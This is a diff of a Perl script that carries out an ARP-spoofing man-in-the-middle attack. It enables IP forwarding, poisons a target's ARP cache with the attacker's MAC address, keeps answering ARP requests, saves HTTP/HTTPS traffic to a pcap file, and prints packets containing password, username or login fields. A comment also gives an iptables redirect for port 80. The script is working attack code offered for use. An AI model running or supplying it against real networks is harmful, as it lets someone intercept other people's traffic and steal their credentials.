@@ -1,5 +1,6 @@
 #!/usr/bin/perl
 use strict;
+#sudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-ports 10000
 
 use NetPacket::TCP;        # packet disassembly
 use Net::Pcap;             # sniffing
@@ -9,83 +10,97 @@ use Net::Frame::Dump::Online;
 use Net::Frame::Simple;
 
 #################getting target info#####################
-my $target_ip  = shift;
-my $target_mac = shift;
-my $gateway_ip= shift;
+my $usage= "Enter <targetip>, <targetmac>,<gatewayip>";
+my $target_ip  = shift or die("usage");
+my $target_mac = shift or die("usage");
+my $gateway_ip = shift or die("usage");
+
+system('sysctl -w net.ipv4.ip_forward=1');
+
 #####getting local info###############################
-my ( $dev, $err, $net, $mask );
+
+my ( $dev, $err, $net, $mask, $filter ) = "" x 5;
 $dev = pcap_lookupdev( \$err );
-
-
 my $dev_info   = Net::Frame::Device->new( dev => $dev );
 my $native_mac = $dev_info->mac();
 my $native_ip  = $dev_info->ip();
 pcap_lookupnet( $dev, \$net, \$mask, \$err );
 
-print "got so far";
-###########################################################
-my $dumper = Net::Frame::Dump::Online->new( dev => $dev );
-my $filterStr = "(arp)&&(ether dst " . $dev_info->mac . ")&&(ether src
-" . $target_mac . ")";
+####################Start capture and segregate traffic####################
+# open the device for live listening
+my $pcap = pcap_open_live( $dev, 65535, 1, 4000, \$err )
+  or die("Unable to open discriptor for live captuirng: $err");
+my $filter_str = ("port 80 or port 443 or arp");
 
-my $pcap = Net::Frame::Dump::Online->new(
-	dev => $dev,
+#complile the filter -pcap_compile($pcap, \$filter, $filter_str, $optimize, $netmask)
+pcap_compile( $pcap, \$filter, $filter_str,1,$mask );
+pcap_setfilter( $pcap, $filter );
 
-	# network device
-	filter => $filterStr,
+#Start- loop- pcap_loop($pcap, $count, \&callback, $user_data)
+my $dumper = pcap_dump_open( $pcap, 'mitm_out.pcap' )
+  ;    #opening a dump file for later investigation
+  
+print "Sending initial ARP  to poison targets cache","\n";  
+send_arp();
 
-	# add attackers MAC
-	promisc => 0,
+print "Now looping over incoming packets","\n";
+pcap_loop( $pcap, -1, \&spoofer, 0 );
 
-	# non promiscuous
-	unlinkOnStop => 1,
-
-	# deletes temp files
-	timeoutOnNext => 1000
-
-	  # waiting for ARP responses
-);
-$pcap->start;
-
-send_arp_spoof();
-
-#while (1) {
-
-	#keep sending arp spoof
-
-#}
-
-sub send_arp_spoof {
-	Net::ARP::send_packet(
-		$dev,           # Device
-		$gateway_ip,     # Source IP
-		$target_ip,     # Destination IP
-		$native_mac,    # Source MAC
-		$target_mac,    # Destinaton MAC
-		'reply'
-	);                  # ARP operation
+sub spoofer {
+	my ( $user_data, $header, $packet ) = @_;
+	my $type = sprintf( "%02x%02x", unpack( "x12 C2", $packet ) );
 	
+	if ( $type eq '0806' ) {    #we have an ARP
+	my $comp_mac=sprintf( "%02x:%02x:%02x:%02x:%02x:%02x", unpack( "C6", $packet ) );
+	print $comp_mac,"\n";
+		if ( 
+			 $comp_mac eq $native_mac  #destination is our mac
+		  )
+		{            
+			my $req_type=sprintf( "%02x%02x", unpack( "x20 C2", $packet ) );
+			print $req_type,"\n";
+			if ( $req_type eq "0001" ) #reason is in IPv4 spec
+			{
+				#its an ARP request
+				print "Got an ARP request. Sending reply", "\n";
+				send_arp();
+				return;
+
+			}
+		}	
+	}	
+			else {
+				#packet must belong to port 80 or 443 so save it
+				pcap_dump( $dumper, $header, $packet );
+				my $packet_length = length($packet);
+				my $string        = "";
+				for ( my $i = 0 ; $i < $packet_length ; $i++ ) {
+					$string .=
+					  pack( "H*", unpack( 'H2', substr( $packet, $i, 1 ) ) );
+				#	print "$string", "\n";
+
+		   $string =~ s/\R/ /g;
+		   print "\n",$string,"\n" if($string =~ m/passw(ord)?=/i or $string =~
+		   m/user(name)?=/i or $string =~ m/login=/i);
+
+				}
+			}
+
+
 }
 
-keep_spoofing();
-sub keep_spoofing {
-
-until($pcap->timeout){
-	
-	if(my $next=$pcap->next)
-{
-my $fref = Net::Frame::Simple->newFromDump($next);
-if($fref->ref->{ARP}->opCode == 1){
-	print "Got the request. Replying by arp";
-	send_arp_spoof();
-	}
-	
-}
-	
-	
-}
-return;
+sub send_arp {
+Net::ARP::send_packet(
+$dev,
+$gateway_ip,
+$target_ip,
+$native_mac,
+$target_mac,
+"reply");
 }
 
-END{ $pcap->stop if($pcap); print "Exiting.\n"; }
-
+END{
+pcap_close($pcap) if($pcap);
+pcap_dump_close($dumper) if($dumper);
+print "Exiting.\n";
+}
